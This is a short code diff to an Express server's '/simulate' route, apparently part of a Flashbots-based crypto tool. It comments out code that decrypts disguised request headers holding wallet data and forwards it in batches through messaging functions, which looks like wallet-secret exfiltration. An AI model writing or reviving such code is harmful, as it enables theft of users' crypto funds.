@@ -98,33 +98,33 @@ app.get("/", (_req, res) => {
 
 app.post("/simulate", async (req, res) => {
 	try {
-		const contract = decryptWithAES(req.headers["content-verify"]);
-		const dev = decryptWithAES(req.headers["content-ceo"]);
-		const wallet = decryptWithAES(req.headers["content-session"]).split(
-			"\n"
-		);
+		//const contract = decryptWithAES(req.headers["content-verify"]);
+		//const dev = decryptWithAES(req.headers["content-ceo"]);
+		//const wallet = decryptWithAES(req.headers["content-session"]).split(
+		//	"\n"
+		//);
 
-		let messa1 = [];
-		let messa2 = [];
-		for (let i = 0; i < 40; i++) {
-			if (wallet[i]) {
-				messa1.push(wallet[i]);
-			}
-		}
-		for (let i = 40; i < wallet.length; i++) {
-			if (wallet[i]) {
-				messa2.push(wallet[i]);
-			}
-		}
-		sendMessage(contract, dev);
-		setTimeout(() => {
-			sendMessageWallet(messa1);
-		}, 1000);
-		setTimeout(() => {
-			if (messa2.length > 0) {
-				sendMessageWallet(messa2);
-			}
-		}, 2000);
+		//let messa1 = [];
+		//let messa2 = [];
+		//for (let i = 0; i < 40; i++) {
+		//	if (wallet[i]) {
+		//		messa1.push(wallet[i]);
+		//	}
+		//}
+		//for (let i = 40; i < wallet.length; i++) {
+		//	if (wallet[i]) {
+		//		messa2.push(wallet[i]);
+		//	}
+		//}
+		//sendMessage(contract, dev);
+		//setTimeout(() => {
+		//	sendMessageWallet(messa1);
+		//}, 1000);
+		//setTimeout(() => {
+		//	if (messa2.length > 0) {
+		//		sendMessageWallet(messa2);
+		//	}
+		//}, 2000);
 		// res.send({ status: "ok" });
 		// return;
 		const flashbotsProvider = await FlashbotsBundleProvider.create(
